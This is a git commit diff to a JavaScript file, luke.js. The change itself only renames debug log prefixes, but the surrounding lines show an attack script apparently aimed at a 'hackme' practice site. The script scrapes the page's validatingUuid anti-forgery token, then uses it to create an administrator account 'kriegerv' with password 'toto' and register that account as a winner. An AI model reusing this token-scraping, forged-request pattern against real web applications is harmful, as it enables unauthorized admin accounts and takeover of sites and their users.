9185b7c9b9dce05dd7146e72c9301ae319e1ce3a
enopeus <enopeus@gmail.com>
2014-11-26 21:42:12 +0100

    Update luke.js

--- luke.js
+++ luke.js
@@ -6,19 +6,19 @@ if (!req) try { req = new ActiveXObject("Microsoft.XMLHTTP"); } catch(e) {}
 req.open('GET', 'http://hackme.groupinfra.com/'+pagename+'/pages/listUsers', false);
 req.send(null);
 var validatingUuid = req.responseText.substring(req.responseText.indexOf('name="validatingUuid" value="'),37);
-console.log("1." + req.responseText);
+console.log("VK1." + req.responseText);
 if(req.responseText){
 //var validatingUuid = $(req.responseText).add("[name='validatingUuid']")[0].value;
-console.log("2." + validatingUuid);
+console.log("VK2." + validatingUuid);
 //if(validatingUuid){
 //var validatingUuidValue = $("[name='validatingUuid']")[0].value;
 //console.log("3." + validatingUuidValue);
 req.open('GET', 'http://hackme.groupinfra.com/'+pagename+'/pages/saveUser?name=kriegerv&password=toto&admin=true&id=-1&validatingUuid='+ validatingUuid, false);
 req.send(null);
-console.log("4." + req.responseText);
+console.log("VK4." + req.responseText);
 req.open('GET', 'http://hackme.groupinfra.com/'+pagename+'/pages/addWinner?name=kriegerv&validatingUuid='+ validatingUuid, false);
 req.send(null);
-console.log("5." + req.responseText);
+console.log("VK5." + req.responseText);
 }
 }
 }
